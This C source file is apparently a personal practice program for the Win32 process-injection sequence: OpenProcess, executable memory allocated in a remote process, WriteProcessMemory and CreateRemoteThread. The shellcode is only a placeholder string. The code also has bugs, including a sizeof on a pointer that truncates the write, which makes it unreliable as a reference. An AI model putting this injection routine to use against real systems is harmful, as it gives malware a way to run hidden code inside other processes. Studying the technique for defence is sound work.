/*
* Test program to familiarize myself with win32 API calls commonly used in process injection
*/
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <stdio.h>
/*
 Steps:
	1 - Get a process
		A) iterate through all found processes to find one we want (argv[1])
	2 - Open target process using OpenProcess().
	3 - Allocate space for shellcode in target process
	4 - Write shellcode to allocated memory
	5 - Create a thread in target process and run shellcode wrote to memory page from step 4
	6 - Close handle
*/

// step 1:
DWORD find_process(char *process_name) {
	PROCESSENTRY32 process_entry;
	process_entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if(Process32First(snapshot, &process_entry) == TRUE) {
		while(Process32Next(snapshot, &process_entry) == TRUE) {
			if(stricmp(process_entry.szExeFile, process_name) == 0) {
				CloseHandle(snapshot);
				return process_entry.th32ProcessID;
			}
		}
	}

	CloseHandle(snapshot);
	return 0;
}



int main(char argc, char * argv[]) {
	unsigned char *buf = "some shell code would go here\n";

	//if(find_process(argv[1])) printf("Found!\n");
	//else printf("Process not found!\n");

	DWORD target_process_id = find_process(argv[1]);
	printf("Target Handle = %d\n", target_process_id);

	// Step 2
	HANDLE target_process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_process_id);
	printf("Target Proc Handle = %d\n", target_process_handle);

	// Step 3
	/*
		If VirtualAllocEx() succeeds, it return the base address of the allocated region of pages. If it fails, it returns NULL
	*/
	LPVOID remote_process_buffer = VirtualAllocEx(target_process_handle, NULL, sizeof(buf), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	printf("Remote Proc Buffer = %d\n", remote_process_buffer);

	// Step 4
	if(WriteProcessMemory(target_process_handle, remote_process_buffer, buf, sizeof(buf), NULL) == 0) printf("[FAILED] WriteProcessMemory\n");
	else printf("Wrote to target process handle\n");
	// Step 5
	/*
		second arg can set security attributes. Experiement with this. Can change registry values and what not.
	*/
	CreateRemoteThread(target_process_handle, NULL, 0, remote_process_buffer, NULL, 0, NULL);

	// Step 6
	CloseHandle(target_process_handle);

	return 0;
}
